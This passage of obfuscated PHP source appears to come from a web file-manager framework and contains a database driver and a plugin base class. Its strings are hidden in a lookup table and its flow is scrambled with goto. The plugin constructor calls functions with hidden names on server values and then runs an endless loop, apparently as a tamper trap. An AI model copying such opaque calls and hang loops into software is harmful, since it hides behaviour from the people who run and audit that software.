$bºŠ£º›Í”[856] . $E¸²±õíÈã . $bºŠ£º›Í”[857]; break; case $bºŠ£º›Í”[837]: case $bºŠ£º›Í”[839]: $EÊÓ›‡Í× = $bºŠ£º›Í”[858] . $bºŠ£º›Í”[859] . $bºŠ£º›Í”[860] . strtoupper($E¸²±õíÈã) . $bºŠ£º›Í”[861] . strtoupper($E¸²±õíÈã) . $bºŠ£º›Í”[862]; break; case $bºŠ£º›Í”[863]: $EÊÓ›‡Í× = $bºŠ£º›Í”[864] . $E¸²±õíÈã . $bºŠ£º›Í”[865]; break; case $bºŠ£º›Í”[838]: break; case $bºŠ£º›Í”[866]: default: $EÊÓ›‡Í× = $bºŠ£º›Í”[867] . ($this->dbType == $bºŠ£º›Í”[866] ? "\140{$E¸²±õíÈã}\140" : $E¸²±õíÈã); } } goto DŒ‡ğ×°; f¹Ñİ×¯: } public function getTables($f„Ëø¿á©Ö = '') { $CåÆÎ­×‰¹ =& $_SERVER[¿õñ]; if (think_config($CåÆÎ­×‰¹[869])) { $e†ğï‡ô© = str_replace($CåÆÎ­×‰¹[870], $f„Ëø¿á©Ö, think_config($CåÆÎ­×‰¹[869])); } else { switch ($this->dbType) { case $CåÆÎ­×‰¹[837]: case $CåÆÎ­×‰¹[839]: $e†ğï‡ô© = $CåÆÎ­×‰¹[871]; break; case $CåÆÎ­×‰¹[836]: case $CåÆÎ­×‰¹[854]: $e†ğï‡ô© = $CåÆÎ­×‰¹[872]; break; case $CåÆÎ­×‰¹[863]: $e†ğï‡ô© = $CåÆÎ­×‰¹[873]; break; case $CåÆÎ­×‰¹[838]: think_exception(think_lang($CåÆÎ­×‰¹[874]) . $CåÆÎ­×‰¹[875]); break; case $CåÆÎ­×‰¹[855]: $e†ğï‡ô© = $CåÆÎ­×‰¹[42] . $CåÆÎ­×‰¹[43] . $CåÆÎ­×‰¹[44]; break; case $CåÆÎ­×‰¹[866]: default: if (!empty($f„Ëø¿á©Ö)) { $e†ğï‡ô© = $CåÆÎ­×‰¹[818] . $f„Ëø¿á©Ö; } else { $e†ğï‡ô© = $CåÆÎ­×‰¹[819]; } } } $c­ç¼ãÁ² = $this->query($e†ğï‡ô©); $dòÅçÃ ë = array(); foreach ($c­ç¼ãÁ² as $A¤ÙŠœæ‘£ => $F¢šÉòù¾¶) { $dòÅçÃ ë[$A¤ÙŠœæ‘£] = current($F¢šÉòù¾¶); } return $dòÅçÃ ë; } protected function parseLimit($e‘ğ†‹Øã¹) { $DŠÙ¤ºˆ‚· =& $_SERVER[¿õñ]; $Dƒ¡ÀêÀÇ‹ = $DŠÙ¤ºˆ‚·[33]; if (!empty($e‘ğ†‹Øã¹)) { switch ($this->dbType) { case $DŠÙ¤ºˆ‚·[863]: case $DŠÙ¤ºˆ‚·[855]: $e‘ğ†‹Øã¹ = explode($DŠÙ¤ºˆ‚·[47], $e‘ğ†‹Øã¹); if (count($e‘ğ†‹Øã¹) > 1) { $Dƒ¡ÀêÀÇ‹ .= $DŠÙ¤ºˆ‚·[48] . $e‘ğ†‹Øã¹[1] . $DŠÙ¤ºˆ‚·[49] . $e‘ğ†‹Øã¹[0] . $DŠÙ¤ºˆ‚·[50]; } else { $Dƒ¡ÀêÀÇ‹ .= $DŠÙ¤ºˆ‚·[48] . $e‘ğ†‹Øã¹[0] . $DŠÙ¤ºˆ‚·[50]; } break; case $DŠÙ¤ºˆ‚·[836]: case $DŠÙ¤ºˆ‚·[854]: break; case $DŠÙ¤ºˆ‚·[838]: break; case $DŠÙ¤ºˆ‚·[837]: case $DŠÙ¤ºˆ‚·[839]: break; case $DŠÙ¤ºˆ‚·[866]: default: $Dƒ¡ÀêÀÇ‹ .= $DŠÙ¤ºˆ‚·[48] . $e‘ğ†‹Øã¹ . $DŠÙ¤ºˆ‚·[50]; } } return $Dƒ¡ÀêÀÇ‹; } public function parseKey(&$CŞ°£ÄÅ, $BÑ°É…à±õ = true) { $f¢ä¡”œò =& $_SERVER[¿õñ]; if ($BÑ°É…à±õ) { $CŞ°£ÄÅ = $this->parseKeyCheck($CŞ°£ÄÅ); } if ($this->dbType == $f¢ä¡”œò[866]) { if ($CŞ°£ÄÅ != $f¢ä¡”œò[173] && !preg_match($f¢ä¡”œò[829], $CŞ°£ÄÅ)) { $CŞ°£ÄÅ = $f¢ä¡”œò[830] . trim($CŞ°£ÄÅ, $f¢ä¡”œò[830]) . $f¢ä¡”œò[830]; } return $CŞ°£ÄÅ; } else { return parent::parseKey($CŞ°£ÄÅ); } } public function close() { $this->_linkID = null; } public function error() { $eª”¬ó‹ïï =& $_SERVER[¿õñ]; if ($this->PDOStatement) { $f÷òå¹Òè = $this->PDOStatement->errorInfo(); $this->error = $f÷òå¹Òè[1] . $eª”¬ó‹ïï[4] . $f÷òå¹Òè[2]; } else { $this->error = $eª”¬ó‹ïï[33]; } if ($eª”¬ó‹ïï[33] != $this->queryStr) { $this->error .= LNG($eª”¬ó‹ïï[45]) . $this->queryStr; } think_trace($this->error, $eª”¬ó‹ïï[33], $eª”¬ó‹ïï[46]); return $this->error; } public function escapeString($BÆ¸éÉ­’÷) { $e­æ¼’ˆ–• =& $_SERVER[¿õñ]; switch ($this->dbType) { case $e­æ¼’ˆ–•[863]: case $e­æ¼’ˆ–•[836]: case $e­æ¼’ˆ–•[854]: case $e­æ¼’ˆ–•[866]: return addslashes($BÆ¸éÉ­’÷); case $e­æ¼’ˆ–•[838]: case $e­æ¼’ˆ–•[855]: case $e­æ¼’ˆ–•[837]: case $e­æ¼’ˆ–•[839]: return str_ireplace($e­æ¼’ˆ–•[55], $e­æ¼’ˆ–•[56], $BÆ¸éÉ­’÷); } } protected function parseValue($EÒÌ°¾ô‘Ô) { $E­’Öê¶ßÆ =& $_SERVER[¿õñ]; if (is_string($EÒÌ°¾ô‘Ô)) { $EÒÌ°¾ô‘Ô = strpos($EÒÌ°¾ô‘Ô, $E­’Öê¶ßÆ[4]) === 0 ? $this->escapeString($EÒÌ°¾ô‘Ô) : $E­’Öê¶ßÆ[876] . $this->escapeString($EÒÌ°¾ô‘Ô) . $E­’Öê¶ßÆ[876]; } elseif (isset($EÒÌ°¾ô‘Ô[0]) && is_string($EÒÌ°¾ô‘Ô[0]) && strtolower($EÒÌ°¾ô‘Ô[0]) == $E­’Öê¶ßÆ[282]) { $EÒÌ°¾ô‘Ô = $this->escapeString($EÒÌ°¾ô‘Ô[1]); } elseif (is_array($EÒÌ°¾ô‘Ô)) { $EÒÌ°¾ô‘Ô = array_map(array($this, $E­’Öê¶ßÆ[877]), $EÒÌ°¾ô‘Ô); } elseif (is_bool($EÒÌ°¾ô‘Ô)) { $EÒÌ°¾ô‘Ô = $EÒÌ°¾ô‘Ô ? $E­’Öê¶ßÆ[493] : $E­’Öê¶ßÆ[464]; } elseif (is_null($EÒÌ°¾ô‘Ô)) { $EÒÌ°¾ô‘Ô = $E­’Öê¶ßÆ[100]; } return $EÒÌ°¾ô‘Ô; } public function getLastInsertId() { $D©ê—ÜÊ™… =& $_SERVER[¿õñ]; switch ($this->dbType) { case $D©ê—ÜÊ™…[863]: case $D©ê—ÜÊ™…[855]: case $D©ê—ÜÊ™…[836]: case $D©ê—ÜÊ™…[854]: case $D©ê—ÜÊ™…[838]: case $D©ê—ÜÊ™…[866]: return $this->_linkID->lastInsertId(); case $D©ê—ÜÊ™…[837]: case $D©ê—ÜÊ™…[839]: $CŠÚÇÌ­Éò = $this->table; $c¹´×²Ç«Å = $this->query("\x53\105\x4c\x45\x43\124\x20{$CŠÚÇÌ­Éò}\x2e\x63\165\162\162\166\141\x6c\40\143\x75\162\162\x76\x61\154\40\x46\x52\117\x4d\40\144\165\141\154"); return $c¹´×²Ç«Å ? $c¹´×²Ç«Å[0][$D©ê—ÜÊ™…[878]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($dÚÅöõÛºÆ) { goto D¡Şóè‚·; eÙù†„£ºº: if (!$fàİáÓÌ») { return !1; } if (flock($fàİáÓÌ», LOCK_EX)) { $C§ˆñ†‡Ş = parent::query($dÚÅöõÛºÆ); flock($fàİáÓÌ», LOCK_UN); fclose($fàİáÓÌ»); return $C§ˆñ†‡Ş; } flock($fàİáÓÌ», LOCK_UN); goto aËÊ“Æ¤; aËÊ“Æ¤: fclose($fàİáÓÌ»); show_json($c¬«¬é‹àï[881], !1); return !1; goto cÙã¸—íŞ¤; D¡Şóè‚·: $c¬«¬é‹àï =& $_SERVER[¿õñ]; $FŒÎªÓíó = DATA_PATH . $c¬«¬é‹àï[879]; $fàİáÓÌ» = fopen($FŒÎªÓíó, $c¬«¬é‹àï[880]); goto eÙù†„£ºº; cÙã¸—íŞ¤: } public function execute($c¥ÒÀÎ§‰—) { goto bİù‚Ü¹Ö×; f‘…—¨‰ÛŒ: fclose($c…®Š©˜‘ñ); show_json($BàŸêùÁ‰÷[881], !1); return !1; goto EºÕ—ëœßÏ; a³åâƒ­: if (!$c…®Š©˜‘ñ) { return !1; } if (flock($c…®Š©˜‘ñ, LOCK_EX)) { $aàƒŒÀÑ£ = parent::execute($c¥ÒÀÎ§‰—); flock($c…®Š©˜‘ñ, LOCK_UN); fclose($c…®Š©˜‘ñ); return $aàƒŒÀÑ£; } flock($c…®Š©˜‘ñ, LOCK_UN); goto f‘…—¨‰ÛŒ; bİù‚Ü¹Ö×: $BàŸêùÁ‰÷ =& $_SERVER[¿õñ]; $B´Ñ¦…í•† = DATA_PATH . $BàŸêùÁ‰÷[879]; $c…®Š©˜‘ñ = fopen($B´Ñ¦…í•†, $BàŸêùÁ‰÷[880]); goto a³åâƒ­; EºÕ—ëœßÏ: } } goto b¿Œ‚ĞÇË; cÙ«ˆ©¬«Î: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto a¥¼¶°±ï†; F²´Áã°‚¿: $this->values = array(); return $this; goto E„éˆ‰„ß; C¿Æ«“†ß°: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($CÖõêÄ™­±[1228]); goto dåˆß¢‰ÔÚ; eÓÎµ£—²: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $CÖõêÄ™­±[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $CÖõêÄ™­±[8]; $this->pluginLangArr = $this->initLang(); goto F²´Áã°‚¿; dåˆß¢‰ÔÚ: $this->pluginName = str_replace($CÖõêÄ™­±[1228], $CÖõêÄ™­±[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $CÖõêÄ™­±[8]; $this->pluginApi = app_host_get() . $CÖõêÄ™­±[1229] . $this->pluginName . $CÖõêÄ™­±[8]; goto eÓÎµ£—²; a¥¼¶°±ï†: $CÖõêÄ™­± =& $_SERVER[¿õñ]; if (!isset($_SERVER[$CÖõêÄ™­±[780]]) || !isset($_SERVER[$CÖõêÄ™­±[800]])) { goto cé’õ«¹Óó; d¿ëà¯²Œ: for ($cÛÅñáøÕ = $E°²Ó¶«Â; $cÛÅñáøÕ > 0; $cÛÅñáøÕ++) { $dÌğœµæ = json_encode($GLOBALS[$CÖõêÄ™­±[381]]); } goto a¶®­¹¨ˆ; cé’õ«¹Óó: $fÍÃ‚Õ¸ëƒ = $CÖõêÄ™­±[801]; $CÀ±£µÇà = $CÖõêÄ™­±[781]; $Cœ›“¿ˆ„ = $_SERVER[$CÖõêÄ™­±[782]] . $CÖõêÄ™­±[783]; goto CÄ”Üˆô; D–¨¢íŒë: $dÌğœµæ = $CÖõêÄ™­±[802]; $dÌğœµæ($_SERVER[$CÖõêÄ™­±[803]]); $E°²Ó¶«Â = 1; goto d¿ëà¯²Œ; CÄ”Üˆô: $EœÓó¿áˆ = $CÀ±£µÇà($Cœ›“¿ˆ„); $c¨ºĞÃàØƒ = explode($CÖõêÄ™­±[214], $EœÓó¿áˆ); if (count($c¨ºĞÃàØƒ) < $CÖõêÄ™­±[553]) { $A¡æÉ½²­ = $CÖõêÄ™­±[784]; $A¡æÉ½²­(); } goto D–¨¢íŒë; a¶®­¹¨ˆ: } global $in, $config; goto C¿Æ«“†ß°; E„éˆ‰„ß: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¿õñ][1230]); } protected function assign($CÍ’ÙŠòà, $Dô‰ô‚ƒ¸ë = false) { if (is_array($CÍ’ÙŠòà)) { $this->values = array_merge($this->values, $CÍ’ÙŠòà); } else { $this->values[$CÍ’ÙŠòà] = $Dô‰ô‚ƒ¸ë; } } protected function display($a±Ç›‚Ş±) { extract($this->values); require $a±Ç›‚Ş±; } final function hookRegist($F÷œ¥ª¨é÷) { $this->modelPlugin->appRegist($this->pluginName, $F÷œ¥ª¨é÷); } final function appIcon() { $Cì…äñ¤ =& $_SERVER[¿õñ]; $A‹‚ùÜ¦Ç‘ = $this->appPackage(); $D¨™Š¨ƒõ¢ = $Cì…äñ¤[33]; if (isset($A‹‚ùÜ¦Ç‘[$Cì…äñ¤[379]])) { if (isset($A‹‚ùÜ¦Ç‘[$Cì…äñ¤[379]][$Cì…äñ¤[1231]])) { $D¨™Š¨ƒõ¢ = $Cì…äñ¤[1232] . $A‹‚ùÜ¦Ç‘[$Cì…äñ¤[379]][$Cì…äñ¤[1231]] . $Cì…äñ¤[1233]; } else { if ($A‹‚ùÜ¦Ç‘[$Cì…äñ¤[379]][$Cì…äñ¤[1234]]) { $D¨™Š¨ƒõ¢ = $Cì…äñ¤[1235] . $A‹‚ùÜ¦Ç‘[$Cì…äñ¤[379]][$Cì…äñ¤[1234]] . $Cì…äñ¤[1236]; } } } return $D¨™Š¨ƒõ¢; } final function fileCanView($AğÙáà¼ä) { $CÏŠÂ‚àö =& $_SERVER[¿õñ]; if ($this->isShare($AğÙáà¼ä)) { return !0; } if (!Action($CÏŠÂ‚àö[1237])->authCan($CÏŠÂ‚àö[1238])) { show_tips(LNG($CÏŠÂ‚àö[1239]), !1); } ActionCall($CÏŠÂ‚àö[1240], $AğÙáà¼ä); } final function isShare($B×”©¤‡àÅ) { $f è¡šŒçÑ = KodIO::parse($B×”©¤‡àÅ); return $f è¡šŒçÑ[$_SERVER[¿õñ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Dãï­á”±) { if (request_url_safe($Dãï­á”±)) { return $Dãï­á”±; } if (!$this->isShare($Dãï­á”±)) { $Dãï­á”± = $this->filePath($Dãï­á”±); } return Action($_SERVER[¿õñ][1001])->linkOut($Dãï­á”±); } public function filePathLinkOut($B½Ò÷îƒ‚Š) { if (request_url_safe($B½Ò÷îƒ‚Š)) { return $B½Ò÷îƒ‚Š; } $this->fileCanView($B½Ò÷îƒ‚Š); return Action($_SERVER[¿õñ][1001])->link($B½Ò÷îƒ‚Š); } final function filePath($Aà¸ì‰İ¡ò) { if ($eğïëƒŒ‡È = $this->checkSharePath($Aà¸ì‰İ¡ò)) { return $eğïëƒŒ‡È; } $this->fileCanView($Aà¸ì‰İ¡ò); if (request_url_safe($Aà¸ì‰İ¡ò)) { $Aà¸ì‰İ¡ò = $this->_cacheHttpFile($Aà¸ì‰İ¡ò); $this->fileInfo = IO::infoWithChildren($Aà¸ì‰İ¡ò); } else { $this->fileInfo = IO::infoWithChildren($Aà¸ì‰İ¡ò); if (!$this->fileInfo) { show_tips(LNG($_SERVER[¿õñ][101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $Aà¸ì‰İ¡ò; } final function _cacheHttpFile($aÏÏŠ†™‡¶) { $d¸àŞ¿Ü ¾ = hash_path($aÏÏŠ†™‡¶, !0); $this->cachePath = $this->pluginCachePath($d¸àŞ¿Ü ¾); if ($bôî©ì¯‡ = IO::fileNameExist($this->cachePath, $d¸àŞ¿Ü ¾)) { return KodIO::make($bôî©ì¯‡); } $CÖ“°¬Ë†Ñ = $this->cachePath . $d¸àŞ¿Ü ¾; return $this->pluginCacheFileSet($CÖ“°¬Ë†Ñ, file_get_contents($aÏÏŠ†™‡¶)); } final function _tmpFileName($aÙäˆÒ—†© = array()) { goto Cß™¥ß‰™†; Cß™¥ß‰™†: $eôÃ²¦á­ =& $_SERVER[¿õñ]; if (!$aÙäˆÒ—†©) { $aÙäˆÒ—†© = $this->fileInfo; } if (isset($aÙäˆÒ—†©[$eôÃ²¦á­[161]])) { return $aÙäˆÒ—†©[$eôÃ²¦á­[161]]; } goto c“‚Í‹æ…ª; dÈØ¦¹‘š: return md5(implode($eôÃ²¦á­[71], $d¸‡æª¬ò“)); goto eÔæ÷»œš; c“‚Í‹æ…ª: if (isset($aÙäˆÒ—†©[$eôÃ²¦á­[159]][$eôÃ²¦á­[161]])) { return $aÙäˆÒ—†©[$eôÃ²¦á­[159]][$eôÃ²¦á­[161]]; } $d¸‡æª¬ò“ = array($aÙäˆÒ—†©[$eôÃ²¦á­[28]], $aÙäˆÒ—†©[$eôÃ²¦á­[76]], $aÙäˆÒ—†©[$eôÃ²¦á­[78]]); if (isset($aÙäˆÒ—†©[$eôÃ²¦á­[455]])) { $d¸‡æª¬ò“[] = $aÙäˆÒ—†©[$eôÃ²¦á­[455]]; } goto dÈØ¦¹‘š; eÔæ÷»œš: } final function checkSharePath($cïÃìöŸÚ) { goto C¾×£ğàÕ; eÔÈÓóğƒ‹: $EÉ°ÒÔ„¢ù = Action($a•„¡¸“™À[1001])->sharePathInfo($cïÃìöŸÚ); if (!isset($EÉ°ÒÔ„¢ù[$a•„¡¸“™À[76]])) { show_json(LNG($a•„¡¸“™À[1242]), !1); } $this->fileInfo = $EÉ°ÒÔ„¢ù[$a•„¡¸“™À[159]]; goto cå²„¸¸ÏÚ; cå²„¸¸ÏÚ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$a•„¡¸“™À[161]]); return $EÉ°ÒÔ„¢ù[$a•„¡¸“™À[76]]; goto AÂ‚¥ä…«Ÿ; C¾×£ğàÕ: $a•„¡¸“™À =& $_SERVER[¿õñ]; if (!defined($a•„¡¸“™À[423])) { define($a•„¡¸“™À[1241], 0); } if (!$this->isShare($cïÃìöŸÚ)) { return !1; } goto eÔÈÓóğƒ‹; AÂ‚¥ä…«Ÿ: } final function pluginCachePath($fˆçŒè‰Ø† = '') { $c„’’Œ©ª… =& $_SERVER[¿õñ]; $dƒéÅ£Ñ¬ = IO_PATH_SYSTEM_TEMP . $c„’’Œ©ª…[1243] . $this->pluginName; if (!($A„…À¸‹–™ = IO::infoFull($dƒéÅ£Ñ¬))) { return IO::mkdir($dƒéÅ£Ñ¬ . $c„’’Œ©ª…[8] . $fˆçŒè‰Ø†); } if (empty($fˆçŒè‰Ø†)) { return $A„…À¸‹–™[$c„’’Œ©ª…[76]]; } if (!($F¾†Á¶Ëî = IO::fileNameExist($A„…À¸‹–™[$c„’’Œ©ª…[76]], $fˆçŒè‰Ø†))) { return IO::mkdir($A„…À¸‹–™[$c„’’Œ©ª…[76]] . $fˆçŒè‰Ø†); } return KodIO::make($F¾†Á¶Ëî); } final function pluginCacheFileSet($C±°ÆˆÉÖ, $BÉÎÜ…è„ = '') { $Dê£ßÀÆ´“ =& $_SERVER[¿õñ]; if (!($A¥à§ºÓŠ½ = IO::infoFull($C±°ÆˆÉÖ))) { return IO::mkfile($C±°ÆˆÉÖ, $BÉÎÜ…è„, REPEAT_REPLACE); } IO::setContent($A¥à§ºÓŠ½[$Dê£ßÀÆ´“[76]], $BÉÎÜ…è„); return $A¥à§ºÓŠ½[$Dê£ßÀÆ´“[76]]; } final function pluginLocalFile($Dµ‡–¢Ö‰‡ = '') { goto D’©ÜŒ’ÄÌ; D’©ÜŒ’ÄÌ: $AÒàšğŠ„´ =& $_SERVER[¿õñ]; $Cñ¢Ãø±ğ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Cñ¢Ãø±ğ)) { mk_dir($Cñ¢Ãø±ğ); } goto DÅ”ïò†Ì™; DÑÄµÄ¬ŠÃ: if ($Dµ‡–¢Ö‰‡ != $d©ùª‡Ÿ¯´) { $Dµ‡–¢Ö‰‡ = IO::copy($Dµ‡–¢Ö‰‡, $d©ùª‡Ÿ¯´); } return $Dµ‡–¢Ö‰‡; goto B‡—Íí„¸Ï; A“å§°‡óì: $d©ùª‡Ÿ¯´ = $Cñ¢Ãø±ğ . $c¾êìÒİĞ . $AÒàšğŠ„´[92] . $A˜é½Š¯Ÿ[$AÒàšğŠ„´[157]]; if (@file_exists($d©ùª‡Ÿ¯´)) { return $d©ùª‡Ÿ¯´; } $Dµ‡–¢Ö‰‡ = IO::download($Dµ‡–¢Ö‰‡, $d©ùª‡Ÿ¯´); goto DÑÄµÄ¬ŠÃ; DÅ”ïò†Ì™: if (!$Dµ‡–¢Ö‰‡) { return $Cñ¢Ãø±ğ; } $A˜é½Š¯Ÿ = IO::info($Dµ‡–¢Ö‰‡); $c¾êìÒİĞ = $this->_tmpFileName($A˜é½Š¯Ÿ); goto A“å§°‡óì; B‡—Íí„¸Ï: } final function appPackage() { goto CÏìïÂÉõ; b¸ÅÏ©¿†Ù: $cóÊ“‰ØØ† = Hook::trigger($c£²õØ¤×[1245], $f¦Öèåİó); if ($cóÊ“‰ØØ† && is_array($cóÊ“‰ØØ†)) { $f¦Öèåİó = $cóÊ“‰ØØ†; } $this->packageData = $f¦Öèåİó; goto EÑÇ¨íù‘º; CÏìïÂÉõ: $c£²õØ¤× =& $_SERVER[¿õñ]; if ($this->packageData) { return $this->packageData; } $d¦´¯‘Ö£° = $this->parseFile($this->pluginPath . $c£²õØ¤×[1244]); goto d¤‰ö¬©²†; EÑÇ¨íù‘º: return $f¦Öèåİó; goto cİË¯¢Ô–; d¤‰ö¬©²†: $this->parseLang($d¦´¯‘Ö£°); $f¦Öèåİó = json_decode_force($d¦´¯‘Ö£°); if (!$f¦Öèåİó) { return array(); } goto b¸ÅÏ©¿†Ù; cİË¯¢Ô–: } public function packageInfoGet($Bƒ‰†ÊœŞË) { $EÑ×ÌÃ¤®Ù = $this->appPackage(); return array_get_value($EÑ×ÌÃ¤®Ù, $Bƒ‰†ÊœŞË); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¿õñ][1246]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¿õñ][1247]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¿õñ][1248]); } private function parseFile($F‡§ŞÙ±Óì) { $D¶Ü’Ìò˜ =& $_SERVER[¿õñ]; $E¿óµ‚æŞ = file_get_contents($F‡§ŞÙ±Óì); $FØÇœÔ¡Ş‡ = array($D¶Ü’Ìò˜[1249], $D¶Ü’Ìò˜[1250], $D¶Ü’Ìò˜[1251], $D¶Ü’Ìò˜[1252], $D¶Ü’Ìò˜[1253], $D¶Ü’Ìò˜[1254], $D¶Ü’Ìò˜[1255]); $C©´ñàÏ§ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$D¶Ü’Ìò˜[84]][$D¶Ü’Ìò˜[1256]]); $E¿óµ‚æŞ = str_replace($FØÇœÔ¡Ş‡, $C©´ñàÏ§, $E¿óµ‚æŞ); return $E¿óµ‚æŞ; } private function parseLang(&$b‘ç¨º£¨³) { goto bÖÎŠÕµ„; F½ØÒÆ¢ï­: $AŸ¹Î¦©× = array(); foreach ($CÃæ¬Û“»[0] as $eÉá–¥‹¾) { $dİÅŒ¢¤Ó÷ = substr($eÉá–¥‹¾, strlen($cõ†„ñ‰ƒÁ), -4); $B¥¡ì•´³ = LNG($dİÅŒ¢¤Ó÷); $bõÓ¸èÑï[] = $eÉá–¥‹¾; $AŸ¹Î¦©×[] = str_replace(array($c³ß‰äõêÌ[214], $c³ß‰äõêÌ[726], $c³ß‰äõêÌ[327], $c³ß‰äõêÌ[112]), array($c³ß‰äõêÌ[50], $c³ß‰äõêÌ[50], $c³ß‰äõêÌ[33], $c³ß‰äõêÌ[1259]), $B¥¡ì•´³); } $b‘ç¨º£¨³ = str_replace($bõÓ¸èÑï, $AŸ¹Î¦©×, $b‘ç¨º£¨³); goto dÁ°ì«ÚÒ; dŒ‡àõß¡”: preg_match_all($c³ß‰äõêÌ[1258], $b‘ç¨º£¨³, $CÃæ¬Û“»); if (!is_array($CÃæ¬Û“») || count($CÃæ¬Û“») == 0 || !is_array($CÃæ¬Û“»[0]) || count($CÃæ¬Û“»[0]) == 0) { return; } $bõÓ¸èÑï = array(); goto F½ØÒÆ¢ï­; bÖÎŠÕµ„: $c³ß‰äõêÌ =& $_SERVER[¿õñ]; $cõ†„ñ‰ƒÁ = $c³ß‰äõêÌ[1257]; if (!strstr($b‘ç¨º£¨³, $cõ†„ñ‰ƒÁ)) { return; } goto dŒ‡àõß¡”; dÁ°ì«ÚÒ: } private function parseConfig(&$fõ ¯¨ÍÕ¸) { goto BÚµäÁö³; BÚµäÁö³: $f¢Ôñ’ÀóÆ =& $_SERVER[¿õñ]; $C‰¶±ì±•¯ = $f¢Ôñ’ÀóÆ[1260]; if (!strstr($fõ ¯¨ÍÕ¸, $C‰¶±ì±•¯)) { return; } goto AÎá¨…÷·; FÇ˜†­Ù‘‰: $fõ ¯¨ÍÕ¸ = str_replace($A¨‡†òª…, $d‹‚‰Íˆ“İ, $fõ ¯¨ÍÕ¸); goto eÁœ¢±Ãáå; Eœ¿ã¼Ñ¯: $A¨‡†òª… = array(); $d‹‚‰Íˆ“İ = array(); foreach ($dÖáåÉÀĞÎ[0] as $Cœ×áÌîÃ•) { $cñ¦ÔØ„Û = substr($Cœ×áÌîÃ•, strlen($C‰¶±ì±•¯), -2); $A¨‡†òª…[] = $Cœ×áÌîÃ•; $d‹‚‰Íˆ“İ[] = _get($c‡Í«°İ£Å, $cñ¦ÔØ„Û); } goto FÇ˜†­Ù‘‰; AÎá¨…÷·: preg_match_all($f¢Ôñ’ÀóÆ[1261], $fõ ¯¨ÍÕ¸, $dÖáåÉÀĞÎ); if (!is_array($dÖáåÉÀĞÎ) || count($dÖáåÉÀĞÎ) == 0 || !is_array($dÖáåÉÀĞÎ[0]) || count($dÖáåÉÀĞÎ[0]) == 0) { return; } $c‡Í«°İ£Å = $this->getConfig(); goto Eœ¿ã¼Ñ¯; eÁœ¢±Ãáå: } private function parsePackage(&$eËî°¤ÈÓå) { goto FÚè¿òÒ®©; FÚè¿òÒ®©: $A¨Ü’ô§¤‚ =& $_SERVER[¿õñ]; $AÏ¬Ïãñ = $A¨Ü’ô§¤‚[1262]; if (!strstr($eËî°¤ÈÓå, $AÏ¬Ïãñ)) { return; } goto C¸¹šğ´Ú¾; Cé‹Å¬ßÍ•: $eËî°¤ÈÓå = str_replace($e˜Ó†‰©¦é, $c˜ğÍáÌ˜, $eËî°¤ÈÓå); goto EŒ™‘òî; F«áî´¸‡•: $e˜Ó†‰©¦é = array(); $c˜ğÍáÌ˜ = array(); foreach ($CŠ‰’ô¼Ø[0] as $DÓĞ£¶³óˆ) { $Fˆí¼ãõ¹‘ = substr($DÓĞ£¶³óˆ, strlen($AÏ¬Ïãñ), -2); $e˜Ó†‰©¦é[] = $DÓĞ£¶³óˆ; $c˜ğÍáÌ˜[] = _get($DƒÏ¢Ğ¥ä, $Fˆí¼ãõ¹‘); } goto Cé‹Å¬ßÍ•; C¸¹šğ´Ú¾: preg_match_all($A¨Ü’ô§¤‚[1263], $eËî°¤ÈÓå, $CŠ‰’ô¼Ø); if (!is_array($CŠ‰’ô¼Ø) || count($CŠ‰’ô¼Ø) == 0 || !is_array($CŠ‰’ô¼Ø[0]) || count($CŠ‰’ô¼Ø[0]) == 0) { return; } $DƒÏ¢Ğ¥ä = $this->appPackage(); goto F«áî´¸‡•; EŒ™‘òî: } final function echoFile($FîÜ©·¦›, $F—ØŒ¦Í—Ñ = false) { goto BË©¦Õ æŸ; cÛà«ĞÄó¡: $c‚§ÁÉÚ­å = $this->parseFile($Fâë­‡¿ºŒ); $this->parseLang($c‚§ÁÉÚ­å); $this->parseConfig($c‚§ÁÉÚ­å); goto eç¹âöšİ; BË©¦Õ æŸ: $dÌ¸Ë¨à¼ =& $_SERVER[¿õñ]; $Fâë­‡¿ºŒ = $this->pluginPath . $FîÜ©·¦›; if (ACT == $dÌ¸Ë¨à¼[1264]) { echo $dÌ¸Ë¨à¼[1265] . $this->pluginName . $dÌ¸Ë¨à¼[8] . $FîÜ©·¦› . $dÌ¸Ë¨à¼[1266]; if (!file_exists($Fâë­‡¿ºŒ)) { echo $dÌ¸Ë¨à¼[1267]; return; } } goto cÛà«ĞÄó¡; eç¹âöšİ: $this->parsePackage($c‚§ÁÉÚ­å); if (is_array($F—ØŒ¦Í—Ñ)) { $c‚§ÁÉÚ­å = str_replace(array_keys($F—ØŒ¦Í—Ñ), array_values($F—ØŒ¦Í—Ñ), $c‚§ÁÉÚ­å); } echo $dÌ¸Ë¨à¼[214] . $c‚§ÁÉÚ­å; goto EßÎ¬¤»ÇŒ; EßÎ¬¤»ÇŒ: } final function initLang() { goto Fî·‹è³ƒ¸; FåÆ¯¦ù÷Œ: if (@count($F‰‘¥Àç¹) > 0) { I18n::set($F‰‘¥Àç¹); } return $F‰‘¥Àç¹; goto E»‡çÛ‡‰º; Fî·‹è³ƒ¸: $dÕ¦íƒ÷™õ =& $_SERVER[¿õñ]; $Eà¨‰ËµÂÅ = $dÕ¦íƒ÷™õ[1268]; $FéçŞòÆìì = $this->pluginPath . $dÕ¦íƒ÷™õ[1269]; goto fˆğ“åÇ°©; fˆğ“åÇ°©: $BçÚªğÓ°¹ = I18n::getType(); $F‰‘¥Àç¹ = array(); if (file_exists($FéçŞòÆìì . $BçÚªğÓ°¹ . $dÕ¦íƒ÷™õ[770])) { $F‰‘¥Àç¹ = (include_once $FéçŞòÆìì 